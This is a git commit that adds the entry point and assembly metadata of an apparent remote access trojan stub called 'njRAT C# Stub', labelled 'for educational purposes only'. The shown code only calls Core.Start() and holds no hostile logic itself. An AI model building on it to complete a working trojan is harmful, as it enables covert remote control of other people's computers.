df92190aeaed8fd02a2433165e6b03776a17ac64
NYAN CAT <NYANxCAT@pm.me>
2019-08-25 00:19:57 +0300

    Initial commit

---
+++ njRAT C# Stub/Program.cs
@@ -0,0 +1,24 @@
+﻿using System;
+
+namespace Lime
+{
+
+    /*
+     * │ Author       : NYAN CAT
+     * │ Name         : njRAT C# Stub
+     * │ Contact      : https:github.com/NYAN-x-CAT
+     * 
+     * This program is distributed for educational purposes only.
+     */
+
+
+
+    public class Program
+	{
+		[STAThread]
+		public static void Main()
+		{
+			Core.Start();
+		}
+	}
+}
---
+++ njRAT C# Stub/Properties/AssemblyInfo.cs
@@ -0,0 +1,10 @@
+﻿using System.Runtime.InteropServices;
+using System;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+
+[assembly: AssemblyVersion("0.0.0.0")]
+[assembly: CompilationRelaxations(8)]
+[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
+[assembly: ComVisible(false)]
+
